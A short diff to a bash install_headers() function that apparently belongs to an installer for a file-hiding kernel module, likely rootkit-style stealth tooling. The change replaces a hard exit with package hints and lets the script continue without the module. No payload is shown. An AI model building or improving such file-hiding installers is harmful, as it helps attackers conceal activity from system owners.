@@ -35,10 +35,16 @@ install_headers() {
         exit 1
     fi
     if [[ ! -d "$KDIR" ]]; then
-        echo "[!] Headers installed but ${KDIR} still missing — kernel/headers version mismatch"
-        echo "[!]   Running kernel: ${KVER}"
-        echo "[!]   Try: dnf install -y kernel-devel && reboot (then re-run)"
-        exit 1
+        echo "[!] Headers installed but ${KDIR} still missing"
+        echo "[!]   Running kernel : ${KVER}"
+        echo "[!]   Repo headers may be for a different kernel version"
+        if command -v apt-get &>/dev/null; then
+            echo "[!]   Try: apt-get install linux-headers-$(uname -r) && re-run"
+        else
+            echo "[!]   Try: install matching kernel-devel, reboot, then re-run"
+        fi
+        echo "[!]   Skipping LKM — continuing without file-hiding module"
+        return 1
     fi
     echo "[+] Kernel headers ready"
 }
